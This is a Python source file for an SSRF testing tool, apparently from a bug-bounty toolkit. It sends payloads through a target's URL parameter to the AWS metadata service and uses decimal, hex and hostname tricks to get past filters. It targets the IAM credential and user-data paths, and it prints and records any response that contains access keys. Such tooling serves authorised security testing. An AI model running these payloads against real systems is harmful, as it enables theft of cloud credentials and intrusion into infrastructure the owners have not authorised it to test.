"""
AWS Metadata SSRF Tester
Test for SSRF vulnerabilities that can access AWS metadata service
"""

import requests
from typing import List, Dict, Optional
from urllib.parse import urlparse
from colorama import Fore, Style

# Database integration
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB


class MetadataSSRF:
    """
    Test for SSRF to AWS metadata service (169.254.169.254)
    """

    def __init__(self, target_url: str, target: Optional[str] = None):
        """
        Initialize metadata SSRF tester

        Args:
            target_url: Target URL with parameter to test (e.g., http://example.com?url=INJECT)
            target: Target identifier for database tracking (default: extracted from URL)
        """
        self.target_url = target_url
        self.findings = []

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

    def test_ssrf(self) -> List[Dict]:
        """
        Test for SSRF to metadata service

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'metadata_ssrf')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP]  SKIP: {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Testing SSRF to AWS metadata...{Style.RESET_ALL}")

        payloads = self.generate_payloads()

        for payload_name, payload in payloads:
            result = self.test_payload(payload_name, payload)
            if result:
                self.findings.append(result)

        # Record tool run
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'metadata_ssrf',
            findings_count=len(self.findings),
            success=True
        )

        return self.findings

    def generate_payloads(self) -> List[tuple]:
        """Generate SSRF payloads"""
        base_url = "http://169.254.169.254"

        payloads = [
            # IMDSv1 (no token required)
            ("Metadata root", f"{base_url}/latest/meta-data/"),
            ("IAM credentials", f"{base_url}/latest/meta-data/iam/security-credentials/"),
            ("User data", f"{base_url}/latest/user-data/"),
            ("Instance ID", f"{base_url}/latest/meta-data/instance-id"),
            ("Public keys", f"{base_url}/latest/meta-data/public-keys/"),

            # DNS bypass techniques
            ("DNS bypass 1", "http://metadata.google.internal/computeMetadata/v1/"),  # GCP
            ("DNS bypass 2", "http://instance-data"),  # Alternative

            # Decimal IP bypass
            ("Decimal IP", "http://2852039166/latest/meta-data/"),  # 169.254.169.254 in decimal

            # Hex IP bypass
            ("Hex IP", "http://0xa9fea9fe/latest/meta-data/"),  # 169.254.169.254 in hex
        ]

        return payloads

    def test_payload(self, name: str, payload: str) -> Dict:
        """Test a single SSRF payload"""
        try:
            # Replace INJECT placeholder
            test_url = self.target_url.replace("INJECT", payload)

            print(f"{Fore.YELLOW}[*] Testing: {name}{Style.RESET_ALL}")

            response = requests.get(test_url, timeout=5, allow_redirects=False)

            # Check for metadata indicators
            if self.is_metadata_response(response):
                print(f"{Fore.RED}[!] CRITICAL: SSRF to metadata service!{Style.RESET_ALL}")
                print(f"    Payload: {payload}")
                print(f"    Response: {response.text[:200]}")

                return {
                    "severity": "CRITICAL",
                    "title": f"SSRF to AWS Metadata Service ({name})",
                    "payload": payload,
                    "response": response.text[:500],
                    "impact": "Can retrieve IAM credentials, escalate privileges"
                }

        except requests.exceptions.Timeout:
            pass  # Timeout is expected for some payloads
        except Exception:
            pass

        return None

    def is_metadata_response(self, response: requests.Response) -> bool:
        """Check if response is from metadata service"""
        indicators = [
            "ami-id",
            "instance-id",
            "security-credentials",
            "iam",
            "placement/availability-zone",
            "public-ipv4",
            "AccessKeyId",
            "SecretAccessKey"
        ]

        text = response.text.lower()

        return any(indicator.lower() in text for indicator in indicators)


def main():
    """CLI interface"""
    import sys

    if len(sys.argv) != 2:
        print("Usage: python metadata_ssrf.py <url_with_INJECT_placeholder>")
        print("Example: python metadata_ssrf.py 'http://example.com/fetch?url=INJECT'")
        sys.exit(1)

    target_url = sys.argv[1]

    tester = MetadataSSRF(target_url)
    findings = tester.test_ssrf()

    print(f"\n{Fore.CYAN}=== RESULTS ==={Style.RESET_ALL}")
    print(f"Findings: {len(findings)}")

    if findings:
        print(f"{Fore.RED}[!] CRITICAL SSRF vulnerability found!{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
